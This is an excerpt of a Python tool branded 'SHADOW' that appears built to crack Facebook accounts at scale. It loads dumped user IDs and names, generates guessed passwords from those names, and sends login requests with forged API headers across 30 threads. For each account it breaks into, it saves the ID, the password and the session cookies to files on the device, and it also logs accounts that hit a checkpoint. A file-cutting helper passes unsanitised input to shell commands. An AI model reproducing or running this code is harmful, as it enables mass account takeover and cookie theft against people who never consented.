...
from concurrent.futures import ThreadPoolExecutor as SHADOWSHADOW
from string import * 
...
sys.stdout.write('\x1b]2; SHADOW\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;34m§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§§
   ...
   \033[1;31m .d8888. db   db  .d8b.  d8888b.  .d88b.  db   d8b   db      
   \033[1;31m 88'  YP 88   88 d8' `8b 88  `8D .8P  Y8. 88   I8I   88      
   \033[1;31m `8bo.   88ooo88 88ooo88 88   88 88    88 88   I8I   88      
    \033[1;31m  `Y8b. 88~~~88 88~~~88 88   88 88    88 Y8   I8I   88      
   \033[1;31m db   8D 88   88 88   88 88  .8D `8b  d8' `8b d8'8b d8'      
   \033[1;31m `8888Y' YP   YP YP   YP Y8888D'  `Y88P'   `8b8' `8d8'     
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back SHADOW Menu ")
        exit()

def SHADOW():   
    os.system('clear')
    print(logo)
    print(f'\033[1;32m [1] File Crack')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SHADOW] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SHADOWb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SHADOWb};{ckkk}"
                    print(f"\r{R} [SHADOW-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SHADOW_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SHADOW_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SHADOW-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SHADOW_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SHADOW] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SHADOW-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SHADOW_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SHADOW_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SHADOW-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SHADOW] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SHADOW] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SHADOW-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SHADOW_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with SHADOWSHADOW(max_workers=30) as SHADOWworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SHADOWworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SHADOWworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SHADOWworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SHADOWworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/SHADOW.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/SHADOW.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    SHADOW = input('Put File Name :')
    print(" ")
    SHADOW = input('Saving Put File Name :')
    os.system('touch ' +SHADOW)
    os.system('sort -r '+SHADOW+' | uniq > '+SHADOW)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + SHADOW )
    print(47*'-')
    print("File Saved To :" + SHADOW )
    print(47*'-')
    input(f"{S} Press Enter To Back SHADOW Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/SHADOW.txt\n') 
        filepath = input("Put File Name: ")
